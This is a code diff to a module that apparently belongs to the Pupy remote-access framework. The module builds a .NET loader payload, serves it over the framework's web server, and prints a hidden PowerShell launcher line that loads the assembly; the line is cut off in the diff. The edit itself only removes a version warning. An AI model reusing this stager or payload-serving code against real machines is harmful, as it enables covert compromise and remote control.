@@ -10,7 +10,7 @@ import random
 from string import ascii_uppercase, ascii_lowercase
 from os.path import join, splitext
 
-from pupylib.PupyOutput import Success, Error, Warn, List
+from pupylib.PupyOutput import Success, Error, List
 from pupylib import ROOT
 
 TEMPLATE = join(ROOT, 'payload_templates', 'PupyLoaderTemplate.cs')
@@ -113,8 +113,6 @@ def dotnet_serve_payload(display, server, rawdll, conf, link_ip="<your_ip>"):
     os.unlink(exe_path)
 
     landing_uri = server.pupweb.serve_content(payload, alias='.NET payload')
-
-    display(Warn('Only works with powershell version >= 3'))
 
     display(List([
         "powershell -w hidden -c \"[Reflection.Assembly]::Load("
